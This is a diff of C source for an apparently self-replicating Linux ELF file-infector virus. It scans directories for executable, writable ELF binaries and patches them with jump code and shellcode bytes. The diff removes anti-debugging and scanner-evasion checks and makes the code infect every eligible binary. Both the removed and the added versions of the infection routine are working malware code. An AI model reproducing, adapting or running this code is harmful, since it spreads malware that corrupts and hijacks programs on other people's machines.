@@ -6,7 +6,7 @@
 
 #define RET_PATTERN 0xfffffffc
 
-#define REQ_SIZE	9 //0xb00
+#define REQ_SIZE	10
 
 #define DEBUG 	1
 
@@ -55,17 +55,6 @@ typedef long int intptr; /* ssize_t */
 #define	ELFCLASS32	1
 #define	ELFCLASS64	2
 #define	ELFCLASSNUM	3
-
-#define ELFDATA2LSB	1
-
-/* These constants define the different elf file types */
-#define ET_NONE   0
-#define ET_REL    1
-#define ET_EXEC   2
-#define ET_DYN    3
-#define ET_CORE   4
-#define ET_LOPROC 0xff00
-#define ET_HIPROC 0xffff
 
 
 /* sh_type */
@@ -173,12 +162,11 @@ typedef struct elf64_phdr {
 
 // resource.h
 
-#define RLIMIT_NPROC	6
 #define	RLIMIT_OFILE	8
 
 struct rlimit {
-	unsigned long long	rlim_cur;		/* current (soft) limit */
-	unsigned long long	rlim_max;		/* maximum value for rlim_cur */
+	unsigned long	rlim_cur;		/* current (soft) limit */
+	unsigned long	rlim_max;		/* maximum value for rlim_cur */
 };
 
 // end resource.h
@@ -449,7 +437,6 @@ struct stat {
 #define SYS_MPROTECT	10
 #define SYS_MUNMAP	11
 #define SYS_GETPID  39
-#define SYS_EXIT	60
 #define SYS_GETDENTS	78
 #define SYS_GETCWD  79
 #define SYS_CHMOD	90
@@ -482,8 +469,6 @@ intptr mmap(unsigned long addr, unsigned long len, unsigned long prot, unsigned 
 //intptr munmap(unsigned long addr, size_t len);
 //intptr mprotect(unsigned long start, size_t len, unsigned long prot);
 intptr lseek(unsigned int fd, off_t offset, unsigned int origin);
-intptr my_exit(int error_code);
-intptr ptrace(long request, long pid, unsigned long addr, unsigned long data);
 
 void* syscall6(
 	void* number,
@@ -709,19 +694,13 @@ typedef struct _ftsent {
 
 // end mman-common.h
 
-// ptrace.h
-#define PTRACE_TRACEME		   0
-//
-
 uintptr my_strlen(char const* str);
 char* my_strncat(char *dest, const char *src, size_t n);
 char* my_strncpy(char *dest, const char *src, size_t n);
 void reverse(char str[], int length);
 char* itoa(int num, char* str, int base);
 void* my_memset(void *b, int c, int len);
-void * my_memmem(const void *l, size_t l_len, const void *s, size_t s_len);
 void * my_memmove(void *dst, const void *src, size_t len);
-int detect_scanner();
 int infect(const char* fpath);
 //int my_main(int argc, char* argv[]);
 
@@ -907,26 +886,6 @@ intptr lseek(unsigned int fd, off_t offset, unsigned int origin) {
 		);
 }
 
-intptr my_exit(int error_code)
-{
-	return (intptr)
-		syscall1(
-			(void*)SYS_EXIT,
-			(void*)(long)error_code
-		);
-}
-
-intptr ptrace(long request, long pid, unsigned long addr, unsigned long data) {
-	return (intptr)
-		syscall4(
-			(void*)SYS_PTRACE,
-			(void*)request,
-			(void*)pid,
-			(void*)addr,
-			(void*)data
-		);
-}
-
 // end syscall.c
 
 // stdio.c
@@ -1092,15 +1051,12 @@ int random_pick()
 	urand[10] = 'o';
 	urand[11] = 'm';
 	urand[12] = '\0';
-	if((f = open(urand, O_RDONLY)) < 0) {
-		return 0;
-	}
-	if(read(f, &rand, 1) != 1) {
-		return 0;
-	}
+	f = open(urand, O_RDONLY);
+	read(f, &rand, 1);
 	close(f);
 	
-	return rand;
+	//return rand % 5 == 0; // We infect roughly 1/5 of the binaries.
+	return 1; // nope, infecto 'em all
 }
 
 int file_process(const char *fpath,
@@ -1111,7 +1067,7 @@ int file_process(const char *fpath,
 	if (can_execute(sb, fpath)
 		&& can_write(sb, fpath)
 		&& is_elf(fpath)
-		&& detect_scanner() == 0)
+		&& random_pick())
 	{
 		ret = infect(fpath);
 	}
@@ -1119,126 +1075,9 @@ int file_process(const char *fpath,
 	return ret;
 }
 
-int detect_scanner() {
-	char proc_status[18];
-	proc_status[0] = '/';
-	proc_status[1] = 'p';
-	proc_status[2] = 'r';
-	proc_status[3] = 'o';
-	proc_status[4] = 'c';
-	proc_status[5] = '/';
-	proc_status[6] = 's';
-	proc_status[7] = 'e';
-	proc_status[8] = 'l';
-	proc_status[9] = 'f';
-	proc_status[10] = '/';
-	proc_status[11] = 's';
-	proc_status[12] = 't';
-	proc_status[13] = 'a';
-	proc_status[14] = 't';
-	proc_status[15] = 'u';
-	proc_status[16] = 's';
-	proc_status[17] = '\0';
-
-	char target_str[12];
-	target_str[0] = 'T';
-	target_str[1] = 'r';
-	target_str[2] = 'a';
-	target_str[3] = 'c';
-	target_str[4] = 'e';
-	target_str[5] = 'r';
-	target_str[6] = 'P';
-	target_str[7] = 'i';
-	target_str[8] = 'd';
-	target_str[9] = ':';
-	target_str[10] = '\x09';
-	//target_str[11] = '\0';
-
-	char target_str2[6];
-	target_str2[0] = '\n';
-	target_str2[1] = 'U';
-	target_str2[2] = 'i';
-	target_str2[3] = 'd';
-	target_str2[4] = ':';
-	target_str2[5] = '\0';
-
-	char msg[10];
-	msg[0] = 'D';
-	msg[1] = 'E';
-	msg[2] = 'B';
-	msg[3] = 'U';
-	msg[4] = 'G';
-	msg[5] = '?';
-	msg[6] = '\n';
-	msg[7] = '\0';
-
-	char buf[256];
-
-	int f = open(proc_status, O_RDONLY);
-	if(f<0) {
-		msg[5] = '1';
-		write(1, msg, 7);
-		my_exit(0);
-		return 1;
-	}
-
-	if(read(f, buf, 256) != 256) {
-		msg[5] = '2';
-		write(1, msg, 7);
-		my_exit(0);
-		return 1;
-	}
-
-	char* pos = (char*)my_memmem(buf, 256, target_str, 7);
-
-	if(pos == NULL) {
-		msg[5] = '3';
-		write(1, msg, 7);
-		write(1, buf, my_strlen(buf));
-		my_exit(0);
-		return 1;
-	}
-
-	char* pos2 = (char*)my_memmem(buf, 256, target_str2, 5);
-	if(pos2 == NULL) {
-		msg[5] = '4';
-		write(1, msg, 7);
-		my_exit(0);
-		return 1;
-	}
-
-	for(char* i = pos + 11 ; i < pos2 ; i = (char *)(i + 1) ) {
-		if(*i != '0') {
-			msg[5] = '5';
-			write(1, msg, 7);
-			write(1, buf, my_strlen(buf));
-			my_exit(0);
-			return 1;
-		}
-	}
-
-	
-
-	return 0;
-}
-
 int main(int argc, char* argv[])
 {
 	char root_dir = '.';
-	// if(ptrace(PTRACE_TRACEME, 0, 0, 0) < 0) {
-	// 	char msg[10];
-	// 	msg[0] = 'D';
-	// 	msg[1] = 'E';
-	// 	msg[2] = 'B';
-	// 	msg[3] = 'U';
-	// 	msg[4] = 'G';
-	// 	msg[5] = '6';
-	// 	msg[6] = '\n';
-	// 	msg[7] = '\0';
-	// 	write(1, msg, 7);
-	// 	my_exit(0);
-	// 	return 1;
-	// }
 	int nfds = getdtablesize() - SPARE_FDS;
 	if(nfds == -5) return -1;
 	nfds = nfds > MAX_FDS ? MAX_FDS : nfds;
@@ -1426,712 +1265,117 @@ void * my_memmem(const void *l, size_t l_len, const void *s, size_t s_len)
 // FIXME: your infection logic should be placed here and below.
 int infect(const char* fpath)
 {
-	int victim_fd = open(fpath, O_RDWR | O_APPEND);
+
+	int victim_fd = open(fpath, O_RDWR);
 	if(victim_fd<0) {
 		return -1;
 	}
-
-	Elf64_Ehdr header;
-	if(read(victim_fd, (char*)&header, sizeof(header)) != sizeof(header)) {
-		close(victim_fd);
-		return -1;
-	}
-
-	if(header.e_ident[EI_PAD + 4] == 0xC0 && header.e_ident[EI_PAD + 5] == 0xDE) {
-		close(victim_fd);
-		return -1;
-	}
-
-	if(header.e_type != ET_DYN || header.e_ident[EI_DATA] != ELFDATA2LSB) {
-		close(victim_fd);
-		return -1;
-	}
-
-	char origin_xor = 0x0;
-	origin_xor = header.e_ident[EI_PAD + 6];
-
-	char self[32];
-	self[0] = '/';
-	self[1] = 'p';
-	self[2] = 'r';
-	self[3] = 'o';
-	self[4] = 'c';
-	self[5] = '/';
-	self[6] = 's';
-	self[7] = 'e';
-	self[8] = 'l';
-	self[9] = 'f';
-	self[10] = '/';
-	self[11] = 'e';
-	self[12] = 'x';
-	self[13] = 'e';
-	self[14] = '\0';
-
-	int virus_fd = open(self, O_RDONLY);
-	if(virus_fd<0) {
-		close(victim_fd);
-		return -1;
-	}
-	
-	struct stat virus_info;
-	fstat(virus_fd, &virus_info);
-	void* virus = (void *)mmap(0, virus_info.st_size, PROT_READ , MAP_SHARED, virus_fd, 0);
-
-	//Elf64_Ehdr* virus_header = (Elf64_Ehdr*)virus;
-
-	// char sig_main[12];
-
-	// sig_main[0] = '\x48';
-	// sig_main[1] = '\x83';
-	// sig_main[2] = '\xec';
-
-	// sig_main[3] = '\x18';
-	// sig_main[4] = '\x31';
-	// sig_main[5] = '\xc0';
-	// sig_main[6] = '\xc6';
-	// sig_main[7] = '\x44';
-	// sig_main[8] = '\x24';
-	// sig_main[9] = '\x0f';
-	// sig_main[10] = '\x2e';
-	// sig_main[11] = '\xe8';
-
-	char sig_nop[12];
-	sig_nop[0] = '\x90';
-	sig_nop[1] = '\x90';
-	sig_nop[2] = '\x90';
-	sig_nop[3] = '\x90';
-	sig_nop[4] = '\x48';
-	sig_nop[5] = '\x31';
-	sig_nop[6] = '\xec';
-	sig_nop[7] = '\x48';
-	sig_nop[8] = '\x31';
-	sig_nop[9] = '\xec';
-	sig_nop[10] = '\x90';
-	sig_nop[11] = '\x90';
-
-	for(int i = 0 ; i < 12 ; i++) {
-		sig_nop[i] ^= origin_xor;
-	}
-
-	// char sig_end[11];
-	// sig_end[0] = '\x5B';
-	// sig_end[1] = '\x41';
-	// sig_end[2] = '\x5C';
-	// sig_end[3] = '\x41';
-	// sig_end[4] = '\x5D';
-	// sig_end[5] = '\x41';
-	// sig_end[6] = '\x5E';
-	// sig_end[7] = '\x41';
-	// sig_end[8] = '\x5F';
-	// sig_end[9] = '\x5D';
-	// sig_end[10] = '\xC3';
-
-	//Elf64_Addr sig_main_pos = (Elf64_Addr)my_memmem(virus, virus_info.st_size, sig_main, 12);
-	Elf64_Addr sig_nop_pos = (Elf64_Addr)my_memmem(virus, virus_info.st_size, sig_nop, 12);
-	// //Elf64_Addr sig_end_pos = (Elf64_Addr)my_memmem(virus, virus_info.st_size, sig_end, 11);
-
-	if(sig_nop_pos == NULL) {
-		close(victim_fd);
-		close(virus_fd);
-		return -1;
-	}
-
-	//unsigned long req_size = sig_end_pos + 11 - sig_nop_pos;
-	unsigned long req_size = 0x3000;
-
-	char pay[req_size];
-
-	my_memmove(pay, (void *)sig_nop_pos, req_size);
-
 	struct stat victim_info;
-	fstat(victim_fd, &victim_info);
-
-	//size_t origin_size = victim_info.st_size;
-
-#define LEN_PRE		323
-#define LEN_SUF		68
-
-	char nullbyte = '\x90';
-	for(int i = 0 ; i < LEN_PRE + LEN_SUF + req_size + header.e_shentsize + 0x100 ; i++) {
-	//for(int i = 0 ; i < 0x2000 ; i++) {
-		if(write(victim_fd, &nullbyte, 1) != 1) {
-			close(victim_fd);
-			return -1;
-		}
-	}
-
 	fstat(victim_fd, &victim_info);
 
 	void* victim = (void *)mmap(0, victim_info.st_size, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED, victim_fd, 0);
 
 	Elf64_Ehdr* victim_header = (Elf64_Ehdr*)victim;
 
-	Elf64_Phdr* p_pHeader[victim_header->e_phnum];
-	// Elf64_Shdr* p_sHeader[victim_header->e_shnum];
+	if(victim_header->e_ident[EI_PAD + 2] == 0x5a && victim_header->e_ident[EI_PAD + 3] == 0xfe && victim_header->e_ident[EI_PAD + 4] == 0xC0 && victim_header->e_ident[EI_PAD + 5] == 0xDE) {
+		close(victim_fd);
+		return 0;
+	} else if(victim_header->e_ident[EI_PAD + 2] == 0x00 && victim_header->e_ident[EI_PAD + 3] == 0x00 && victim_header->e_ident[EI_PAD + 4] == 0x00 && victim_header->e_ident[EI_PAD + 5] == 0x00) {
+		victim_header->e_ident[EI_PAD + 4] = 0xC0;
+		victim_header->e_ident[EI_PAD + 5] = 0xDE;
+		close(victim_fd);
+		return 0;
+	}
+
+	char sig[0x18];
+	sig[0] = '\x41';
+	sig[1] = '\x5f';
+	sig[2] = '\x41';
+	sig[3] = '\x5e';
+	sig[4] = '\x41';
+	sig[5] = '\x5d';
+	sig[6] = '\x41';
+	sig[7] = '\x5c';
+	sig[8] = '\x41';
+	sig[9] = '\x5b';
+	sig[10] = '\x41';
+	sig[11] = '\x5a';
+	sig[12] = '\x41';
+	sig[13] = '\x59';
+	sig[14] = '\x41';
+	sig[15] = '\x58';
+	sig[16] = '\x5c';
+	sig[17] = '\x5d';
+	sig[18] = '\x5f';
+	sig[19] = '\x5e';
+	sig[20] = '\x5a';
+	sig[21] = '\x59';
+	sig[22] = '\x5b';
+	sig[23] = '\x58';
+
+	Elf64_Addr sig_pos = (Elf64_Addr)my_memmem(victim, victim_info.st_size, sig, 0x18);
+
+	if(sig_pos == NULL) {
+		close(victim_fd);
+		return -1;
+	}
+
+
+	Elf64_Phdr* pHeader[victim_header->e_phnum];
 	Elf64_Half textseg = 0;
-	// Elf64_Half textsec = 0;
 
 	char* pos = victim + victim_header->e_phoff;
 	for(int i = 0 ; i < victim_header->e_phnum ; i++) {
-		p_pHeader[i] = (Elf64_Phdr*)pos;
-		if(p_pHeader[i]->p_type == PT_LOAD && p_pHeader[i]->p_flags & (PF_R | PF_X)) {
-			textseg = (Elf64_Half)(i-1);
+		pHeader[i] = (Elf64_Phdr*)pos;
+		if(pHeader[i]->p_type == PT_LOAD && pHeader[i]->p_flags & (PF_R | PF_X)) {
+			textseg = (Elf64_Half)i;
 		}
 		pos += victim_header->e_phentsize;
 	}
 
-	// pos = victim + victim_header->e_shoff;
-	// for(int i = 0 ; i < victim_header->e_shnum ; i++) {
-	// 	p_sHeader[i] = (Elf64_Shdr*)pos;
-	// 	pos += victim_header->e_shentsize;
-	// }
+	Elf64_Off padding;
 
-	// char text[6];
-	// text[0] = '.';
-	// text[1] = 't';
-	// text[2] = 'e';
-	// text[3] = 'x';
-	// text[4] = 't';
-	// text[5] = '\0';
-
-	// for(int i = 0 ; i < victim_header->e_shnum ; i++) {
-	// 	if(my_memcmp(victim + p_sHeader[victim_header->e_shstrndx]->sh_offset + p_sHeader[i]->sh_name, text, 5) == 0) {
-	// 		textsec = (Elf64_Half)i;
-	// 	}
-	// }
-
-	Elf64_Addr base = header.e_entry;
-	Elf64_Shdr new_sHeader;
-	new_sHeader.sh_name = 3;
-	new_sHeader.sh_type = SHT_PROGBITS;
-	new_sHeader.sh_flags = SHF_ALLOC | SHF_EXECINSTR;
-	//new_sHeader.sh_addr = sHeader[textsec].sh_addr + 0x1000;
-	//new_sHeader.sh_addr = 0x1000;
-	new_sHeader.sh_addr = p_pHeader[textseg]->p_memsz + 0x1000 - (p_pHeader[textseg]->p_memsz % 0x1000);
-	new_sHeader.sh_offset = victim_header->e_shoff + victim_header->e_shentsize * (victim_header->e_shnum + 1);
-	new_sHeader.sh_size = LEN_PRE + req_size + LEN_SUF;
-	new_sHeader.sh_link = SHN_UNDEF;
-	new_sHeader.sh_info = 0;
-	new_sHeader.sh_addralign = 0;
-	new_sHeader.sh_entsize = 0;
-
-	my_memmove(victim + victim_header->e_shoff + victim_header->e_shentsize * victim_header->e_shnum, (void *)&new_sHeader, sizeof(new_sHeader));
-
-#define LEN_JMP		5
-	char tmp_entry[LEN_JMP];
-	char jump_code[LEN_JMP];
-	jump_code[0] = '\xe9';
-	jump_code[1] = '\x00';
-	jump_code[2] = '\x00';
-	jump_code[3] = '\x00';
-	jump_code[4] = '\x00';
-
-	int offset = 0;
-	int imm = 0;
-	char xor = random_pick();
-
-	my_memmove(tmp_entry, victim + base, LEN_JMP);
+	padding = pHeader[textseg - 1]->p_offset + (sig_pos - (Elf64_Addr)victim);
 	
-	//offset = new_sHeader.sh_addr - base - LEN_JMP;
-	offset = new_sHeader.sh_offset - base - LEN_JMP;
+	int offset = padding + REQ_SIZE - victim_header->e_entry;
+	char tmp_offset[32];
+	tmp_offset[0] = '\x90';
+	tmp_offset[1] = '\x90';
+	tmp_offset[2] = '\x90';
+	tmp_offset[3] = '\x90';
+	tmp_offset[4] = '\x90';
+	tmp_offset[5] = '\xe9';
 
-	// jmp to middle of nop slide
-	offset += 0x100;
-	//
-
-	for(int i = 0 ; i < 3 ; i++) {
-		jump_code[1+i] = (char)(offset & 0x000000ff);
-		offset = offset >> 8;
+	if( offset < 0 ) {
+		offset = -offset;
+		for(int i = 0 ; i < 4 ; i++) {
+			tmp_offset[6+i] = (char)(offset & 0x000000ff);
+			offset = offset >> 8;
+		}
+		
+	} else {
+		offset = 0x0fffffff - offset + 1;
+		for(int i = 0 ; i < 3 ; i++) {
+			tmp_offset[6+i] = (char)(offset & 0x000000ff);
+			offset = offset >> 8;
+		}
+		tmp_offset[9] = '\xff';
 	}
-	jump_code[4] = '\x00';
 
-
-	char code_prefix[LEN_PRE];
-	code_prefix[0] = '\x90';
-	code_prefix[1] = '\x90';
-	code_prefix[2] = '\x90';
-	code_prefix[3] = '\x90';
-	code_prefix[4] = '\x90';
-	code_prefix[5] = '\x90';
-	code_prefix[6] = '\x90';
-	code_prefix[7] = '\x90';
-	code_prefix[8] = '\x90';
-	code_prefix[9] = '\x90';
-	code_prefix[10] = '\x90';
-	code_prefix[11] = '\x90';
-	code_prefix[12] = '\x90';
-	code_prefix[13] = '\x90';
-	code_prefix[14] = '\x90';
-	code_prefix[15] = '\x90';
-	code_prefix[16] = '\x90';
-	code_prefix[17] = '\x90';
-	code_prefix[18] = '\x90';
-	code_prefix[19] = '\x90';
-	code_prefix[20] = '\x90';
-	code_prefix[21] = '\x90';
-	code_prefix[22] = '\x90';
-	code_prefix[23] = '\x90';
-	code_prefix[24] = '\x90';
-	code_prefix[25] = '\x90';
-	code_prefix[26] = '\x90';
-	code_prefix[27] = '\x90';
-	code_prefix[28] = '\x90';
-	code_prefix[29] = '\x90';
-	code_prefix[30] = '\x90';
-	code_prefix[31] = '\x90';
-	code_prefix[32] = '\x90';
-	code_prefix[33] = '\x90';
-	code_prefix[34] = '\x90';
-	code_prefix[35] = '\x90';
-	code_prefix[36] = '\x90';
-	code_prefix[37] = '\x90';
-	code_prefix[38] = '\x90';
-	code_prefix[39] = '\x90';
-	code_prefix[40] = '\x90';
-	code_prefix[41] = '\x90';
-	code_prefix[42] = '\x90';
-	code_prefix[43] = '\x90';
-	code_prefix[44] = '\x90';
-	code_prefix[45] = '\x90';
-	code_prefix[46] = '\x90';
-	code_prefix[47] = '\x90';
-	code_prefix[48] = '\x90';
-	code_prefix[49] = '\x90';
-	code_prefix[50] = '\x90';
-	code_prefix[51] = '\x90';
-	code_prefix[52] = '\x90';
-	code_prefix[53] = '\x90';
-	code_prefix[54] = '\x90';
-	code_prefix[55] = '\x90';
-	code_prefix[56] = '\x90';
-	code_prefix[57] = '\x90';
-	code_prefix[58] = '\x90';
-	code_prefix[59] = '\x90';
-	code_prefix[60] = '\x90';
-	code_prefix[61] = '\x90';
-	code_prefix[62] = '\x90';
-	code_prefix[63] = '\x90';
-	code_prefix[64] = '\x90';
-	code_prefix[65] = '\x90';
-	code_prefix[66] = '\x90';
-	code_prefix[67] = '\x90';
-	code_prefix[68] = '\x90';
-	code_prefix[69] = '\x90';
-	code_prefix[70] = '\x90';
-	code_prefix[71] = '\x90';
-	code_prefix[72] = '\x90';
-	code_prefix[73] = '\x90';
-	code_prefix[74] = '\x90';
-	code_prefix[75] = '\x90';
-	code_prefix[76] = '\x90';
-	code_prefix[77] = '\x90';
-	code_prefix[78] = '\x90';
-	code_prefix[79] = '\x90';
-	code_prefix[80] = '\x90';
-	code_prefix[81] = '\x90';
-	code_prefix[82] = '\x90';
-	code_prefix[83] = '\x90';
-	code_prefix[84] = '\x90';
-	code_prefix[85] = '\x90';
-	code_prefix[86] = '\x90';
-	code_prefix[87] = '\x90';
-	code_prefix[88] = '\x90';
-	code_prefix[89] = '\x90';
-	code_prefix[90] = '\x90';
-	code_prefix[91] = '\x90';
-	code_prefix[92] = '\x90';
-	code_prefix[93] = '\x90';
-	code_prefix[94] = '\x90';
-	code_prefix[95] = '\x90';
-	code_prefix[96] = '\x90';
-	code_prefix[97] = '\x90';
-	code_prefix[98] = '\x90';
-	code_prefix[99] = '\x90';
-	code_prefix[100] = '\x90';
-	code_prefix[101] = '\x90';
-	code_prefix[102] = '\x90';
-	code_prefix[103] = '\x90';
-	code_prefix[104] = '\x90';
-	code_prefix[105] = '\x90';
-	code_prefix[106] = '\x90';
-	code_prefix[107] = '\x90';
-	code_prefix[108] = '\x90';
-	code_prefix[109] = '\x90';
-	code_prefix[110] = '\x90';
-	code_prefix[111] = '\x90';
-	code_prefix[112] = '\x90';
-	code_prefix[113] = '\x90';
-	code_prefix[114] = '\x90';
-	code_prefix[115] = '\x90';
-	code_prefix[116] = '\x90';
-	code_prefix[117] = '\x90';
-	code_prefix[118] = '\x90';
-	code_prefix[119] = '\x90';
-	code_prefix[120] = '\x90';
-	code_prefix[121] = '\x90';
-	code_prefix[122] = '\x90';
-	code_prefix[123] = '\x90';
-	code_prefix[124] = '\x90';
-	code_prefix[125] = '\x90';
-	code_prefix[126] = '\x90';
-	code_prefix[127] = '\x90';
-	code_prefix[128] = '\x90';
-	code_prefix[129] = '\x90';
-	code_prefix[130] = '\x90';
-	code_prefix[131] = '\x90';
-	code_prefix[132] = '\x90';
-	code_prefix[133] = '\x90';
-	code_prefix[134] = '\x90';
-	code_prefix[135] = '\x90';
-	code_prefix[136] = '\x90';
-	code_prefix[137] = '\x90';
-	code_prefix[138] = '\x90';
-	code_prefix[139] = '\x90';
-	code_prefix[140] = '\x90';
-	code_prefix[141] = '\x90';
-	code_prefix[142] = '\x90';
-	code_prefix[143] = '\x90';
-	code_prefix[144] = '\x90';
-	code_prefix[145] = '\x90';
-	code_prefix[146] = '\x90';
-	code_prefix[147] = '\x90';
-	code_prefix[148] = '\x90';
-	code_prefix[149] = '\x90';
-	code_prefix[150] = '\x90';
-	code_prefix[151] = '\x90';
-	code_prefix[152] = '\x90';
-	code_prefix[153] = '\x90';
-	code_prefix[154] = '\x90';
-	code_prefix[155] = '\x90';
-	code_prefix[156] = '\x90';
-	code_prefix[157] = '\x90';
-	code_prefix[158] = '\x90';
-	code_prefix[159] = '\x90';
-	code_prefix[160] = '\x90';
-	code_prefix[161] = '\x90';
-	code_prefix[162] = '\x90';
-	code_prefix[163] = '\x90';
-	code_prefix[164] = '\x90';
-	code_prefix[165] = '\x90';
-	code_prefix[166] = '\x90';
-	code_prefix[167] = '\x90';
-	code_prefix[168] = '\x90';
-	code_prefix[169] = '\x90';
-	code_prefix[170] = '\x90';
-	code_prefix[171] = '\x90';
-	code_prefix[172] = '\x90';
-	code_prefix[173] = '\x90';
-	code_prefix[174] = '\x90';
-	code_prefix[175] = '\x90';
-	code_prefix[176] = '\x90';
-	code_prefix[177] = '\x90';
-	code_prefix[178] = '\x90';
-	code_prefix[179] = '\x90';
-	code_prefix[180] = '\x90';
-	code_prefix[181] = '\x90';
-	code_prefix[182] = '\x90';
-	code_prefix[183] = '\x90';
-	code_prefix[184] = '\x90';
-	code_prefix[185] = '\x90';
-	code_prefix[186] = '\x90';
-	code_prefix[187] = '\x90';
-	code_prefix[188] = '\x90';
-	code_prefix[189] = '\x90';
-	code_prefix[190] = '\x90';
-	code_prefix[191] = '\x90';
-	code_prefix[192] = '\x90';
-	code_prefix[193] = '\x90';
-	code_prefix[194] = '\x90';
-	code_prefix[195] = '\x90';
-	code_prefix[196] = '\x90';
-	code_prefix[197] = '\x90';
-	code_prefix[198] = '\x90';
-	code_prefix[199] = '\x90';
-	code_prefix[200] = '\x90';
-	code_prefix[201] = '\x90';
-	code_prefix[202] = '\x90';
-	code_prefix[203] = '\x90';
-	code_prefix[204] = '\x90';
-	code_prefix[205] = '\x90';
-	code_prefix[206] = '\x90';
-	code_prefix[207] = '\x90';
-	code_prefix[208] = '\x90';
-	code_prefix[209] = '\x90';
-	code_prefix[210] = '\x90';
-	code_prefix[211] = '\x90';
-	code_prefix[212] = '\x90';
-	code_prefix[213] = '\x90';
-	code_prefix[214] = '\x90';
-	code_prefix[215] = '\x90';
-	code_prefix[216] = '\x90';
-	code_prefix[217] = '\x90';
-	code_prefix[218] = '\x90';
-	code_prefix[219] = '\x90';
-	code_prefix[220] = '\x90';
-	code_prefix[221] = '\x90';
-	code_prefix[222] = '\x90';
-	code_prefix[223] = '\x90';
-	code_prefix[224] = '\x90';
-	code_prefix[225] = '\x90';
-	code_prefix[226] = '\x90';
-	code_prefix[227] = '\x90';
-	code_prefix[228] = '\x90';
-	code_prefix[229] = '\x90';
-	code_prefix[230] = '\x90';
-	code_prefix[231] = '\x90';
-	code_prefix[232] = '\x90';
-	code_prefix[233] = '\x90';
-	code_prefix[234] = '\x90';
-	code_prefix[235] = '\x90';
-	code_prefix[236] = '\x90';
-	code_prefix[237] = '\x90';
-	code_prefix[238] = '\x90';
-	code_prefix[239] = '\x90';
-	code_prefix[240] = '\x90';
-	code_prefix[241] = '\x90';
-	code_prefix[242] = '\x90';
-	code_prefix[243] = '\x90';
-	code_prefix[244] = '\x90';
-	code_prefix[245] = '\x90';
-	code_prefix[246] = '\x90';
-	code_prefix[247] = '\x90';
-	code_prefix[248] = '\x90';
-	code_prefix[249] = '\x90';
-	code_prefix[250] = '\x90';
-	code_prefix[251] = '\x90';
-	code_prefix[252] = '\x90';
-	code_prefix[253] = '\x90';
-	code_prefix[254] = '\x90';
-	code_prefix[255] = '\x90';
-	code_prefix[256] = '\x90';
-	code_prefix[257] = '\x90';
-	code_prefix[258] = '\x90';
-	code_prefix[259] = '\x90';
-	code_prefix[260] = '\x90';
-	code_prefix[261] = '\x90';
-	code_prefix[262] = '\x90';
-	code_prefix[263] = '\x90';
-	code_prefix[264] = '\x50';
-	code_prefix[265] = '\x53';
-	code_prefix[266] = '\x51';
-	code_prefix[267] = '\x52';
-	code_prefix[268] = '\x56';
-	code_prefix[269] = '\x57';
-	code_prefix[270] = '\x55';
-	code_prefix[271] = '\x54';
-	code_prefix[272] = '\x41';
-	code_prefix[273] = '\x50';
-	code_prefix[274] = '\x41';
-	code_prefix[275] = '\x51';
-	code_prefix[276] = '\x41';
-	code_prefix[277] = '\x52';
-	code_prefix[278] = '\x41';
-	code_prefix[279] = '\x53';
-	code_prefix[280] = '\x41';
-	code_prefix[281] = '\x54';
-	code_prefix[282] = '\x41';
-	code_prefix[283] = '\x55';
-	code_prefix[284] = '\x41';
-	code_prefix[285] = '\x56';
-	code_prefix[286] = '\x41';
-	code_prefix[287] = '\x57';
-	code_prefix[288] = '\x4c';
-	code_prefix[289] = '\x8d';
-	code_prefix[290] = '\x3d';
-	code_prefix[291] = '\x1c';
-	code_prefix[292] = '\x00';
-	code_prefix[293] = '\x00';
-	code_prefix[294] = '\x00';
-	code_prefix[295] = '\x4d';
-	code_prefix[296] = '\x31';
-	code_prefix[297] = '\xf6';
-	code_prefix[298] = '\x43';
-	code_prefix[299] = '\x80';
-	code_prefix[300] = '\x34';
-	code_prefix[301] = '\x37';
-	code_prefix[302] = '\x00';
-	code_prefix[303] = '\x49';
-	code_prefix[304] = '\xff';
-	code_prefix[305] = '\xc6';
-	code_prefix[306] = '\x49';
-	code_prefix[307] = '\x81';
-	code_prefix[308] = '\xfe';
-	code_prefix[309] = '\xed';
-	code_prefix[310] = '\xac';
-	code_prefix[311] = '\x00';
-	code_prefix[312] = '\x00';
-	code_prefix[313] = '\x75';
-	code_prefix[314] = '\xef';
-	code_prefix[315] = '\x90';
-	code_prefix[316] = '\x90';
-	code_prefix[317] = '\x90';
-	code_prefix[318] = '\x90';
-	code_prefix[319] = '\x90';
-	code_prefix[320] = '\x90';
-	code_prefix[321] = '\x90';
-	code_prefix[322] = '\x90';
-
-	char code_suffix[LEN_SUF];
-	code_suffix[0] = '\x90';
-	code_suffix[1] = '\x90';
-	code_suffix[2] = '\x90';
-	code_suffix[3] = '\x90';
-	code_suffix[4] = '\x90';
-	code_suffix[5] = '\x90';
-	code_suffix[6] = '\x90';
-	code_suffix[7] = '\x90';
-	code_suffix[8] = '\x4c';
-	code_suffix[9] = '\x8d';
-	code_suffix[10] = '\x3d';
-	code_suffix[11] = '\x13';
-	code_suffix[12] = '\x53';
-	code_suffix[13] = '\xff';
-	code_suffix[14] = '\xff';
-	code_suffix[15] = '\x41';
-	code_suffix[16] = '\xc6';
-	code_suffix[17] = '\x07';
-	code_suffix[18] = '\xca';
-	code_suffix[19] = '\x41';
-	code_suffix[20] = '\xc6';
-	code_suffix[21] = '\x47';
-	code_suffix[22] = '\x01';
-	code_suffix[23] = '\xfe';
-	code_suffix[24] = '\x41';
-	code_suffix[25] = '\xc6';
-	code_suffix[26] = '\x47';
-	code_suffix[27] = '\x02';
-	code_suffix[28] = '\xba';
-	code_suffix[29] = '\x41';
-	code_suffix[30] = '\xc6';
-	code_suffix[31] = '\x47';
-	code_suffix[32] = '\x03';
-	code_suffix[33] = '\xba';
-	code_suffix[34] = '\x41';
-	code_suffix[35] = '\xc6';
-	code_suffix[36] = '\x47';
-	code_suffix[37] = '\x04';
-	code_suffix[38] = '\xbe';
-	code_suffix[39] = '\x41';
-	code_suffix[40] = '\x5f';
-	code_suffix[41] = '\x41';
-	code_suffix[42] = '\x5e';
-	code_suffix[43] = '\x41';
-	code_suffix[44] = '\x5d';
-	code_suffix[45] = '\x41';
-	code_suffix[46] = '\x5c';
-	code_suffix[47] = '\x41';
-	code_suffix[48] = '\x5b';
-	code_suffix[49] = '\x41';
-	code_suffix[50] = '\x5a';
-	code_suffix[51] = '\x41';
-	code_suffix[52] = '\x59';
-	code_suffix[53] = '\x41';
-	code_suffix[54] = '\x58';
-	code_suffix[55] = '\x5c';
-	code_suffix[56] = '\x5d';
-	code_suffix[57] = '\x5f';
-	code_suffix[58] = '\x5e';
-	code_suffix[59] = '\x5a';
-	code_suffix[60] = '\x59';
-	code_suffix[61] = '\x5b';
